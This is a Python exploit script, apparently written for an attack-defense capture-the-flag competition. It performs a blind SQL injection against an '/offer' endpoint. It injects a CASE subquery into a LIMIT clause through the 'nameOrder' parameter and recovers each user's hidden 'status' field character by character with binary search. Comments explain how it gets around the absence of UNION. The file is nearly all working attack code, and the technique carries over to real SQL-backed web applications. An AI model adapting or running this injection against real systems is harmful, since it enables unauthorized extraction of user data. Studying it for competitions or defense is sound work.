import requests
import sys


def extract_status(team_ip, port, user_id):
    url = f"http://{team_ip}:{port}/offer"

    status = "ECSC_"

    def get_payload(mid):
        # Because we can't use UNION after we need to be a bit more creative
        # We can also not use an expression instead of ASC/DESC in the order by clause
        # But what we can do is use an expression in the LIMIT clause
        # Here we change the limit clause based on a subquery. We either get 0 or 1 row returned
        # Therefore we can use for a binary-tree-search-like blind sqli
        name_order_sqli = \
            f"""
            LIMIT
            (
                CASE
                WHEN EXISTS(
                        SELECT * 
                        FROM profiles 
                        WHERE id={user_id} AND ASCII(SUBSTRING(status, {len(status)+1}, 1)) > {mid}
                        )
                    THEN 1
                ELSE 0
                END
            ) --
            """
        return {
            "nameOrder": name_order_sqli.replace("  ", "").replace("\n", " ")
        }

    lowest_char = 32
    highest_char = 126

    while len(status) != (len("ECSC_")+32):
        low = lowest_char
        high = highest_char
        while low <= high:
            mid = low + (high - low) // 2
            page_data = get_payload(mid)

            resp = requests.get(url, page_data)
            if len(resp.json()):
                low = mid + 1
            else:
                high = mid - 1
        status += chr(low)
    print(f"FOUND FLAG for user id {user_id}: '{status}'")


def exploit(team_ip, port, user_ids):
    for user_id in user_ids:
        extract_status(team_ip, port, user_id)


if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python exploit.py <TEAM_IP> <PORT> [<FLAG_ID> ...]")
        sys.exit(-1)
    exploit(sys.argv[1], sys.argv[2], sys.argv[3:])